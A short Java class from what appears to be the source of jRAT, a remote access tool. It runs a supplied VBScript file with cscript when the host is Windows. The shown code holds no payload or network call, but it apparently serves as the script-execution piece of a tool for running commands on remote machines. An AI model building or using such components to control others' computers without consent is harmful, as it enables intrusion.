package se.jrat.common.script;

import java.io.File;

import com.redpois0n.oslib.OperatingSystem;

public class VisualBasicScript extends Script {

	@Override
	protected void perform(File file) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { "cscript", file.getAbsolutePath() });
		}
	}

	@Override
	public String getExtension() {
		return "vbs";
	}

}
